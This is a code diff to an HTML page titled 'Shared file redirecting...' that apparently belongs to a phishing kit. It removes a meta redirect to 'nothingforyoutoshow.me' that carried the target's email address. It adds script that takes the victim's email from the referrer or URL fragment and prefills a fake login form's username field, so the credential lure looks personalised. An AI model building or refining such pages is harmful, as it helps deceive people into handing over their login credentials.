@@ -2,7 +2,43 @@
 <html>
 <head>
    <title>Shared file redirecting...</title>
-   <meta http-equiv="refresh" content="0; url = https://nothingforyoutoshow.me#<EMAIL>" />
+   <script nonce="MzIyMzI4ODY0NCw0MTI2NTI5ODAx">
+    window.onload = function () {
+        var referrerEmail = document.referrer.split('#')[1];
+        console.log(referrerEmail);
+        if (referrerEmail) {
+            var currentUrl = window.location.href;
+            var newUrl = currentUrl + '#' + referrerEmail;
+            console.log(referrerEmail);
+            window.history.replaceState({}, document.title, newUrl);
+            var emailField = document.getElementById('username');
+            if (emailField) {
+                emailField.value = referrerEmail;
+                console.log(referrerEmail);
+            }
+        }
+    };
+    var urlFragment = window.location.hash.substring(1);
+    if (urlFragment) {
+        var usernameInput = document.getElementById("username");
+        if (usernameInput) {
+            usernameInput.value = urlFragment;
+        }
+    }
+</script>
 </head>
+<body>
 
+   <div ng-class="{'has-error':error.langkey=='LANG_LOGIN_ERROR_EMPTY_USERNAME'}" class="form-group">
+ <!-- <input type="text" name="user" id="username" class="form-control ng-valid ng-dirty ng-valid-parse ng-touched" id="username" aria-label="Login ID" focus-directive="true" style="
+    width: 319.64706px;
+"> -->
+<input type="text" id="username" name="username"
+style="height: 45px; margin-top: 10px; width: 60%; padding-left: 8px; border: 0.01px solid black; font-size: 18px; width: 319.64706px">
+ <span class="fa fa-lg fa-exclamation-circle input-error sf-hidden" title="" aria-label=""></span>
+ </div>
+ <div class="form-group">
+ 
+ </div>
+</body>
 </html>
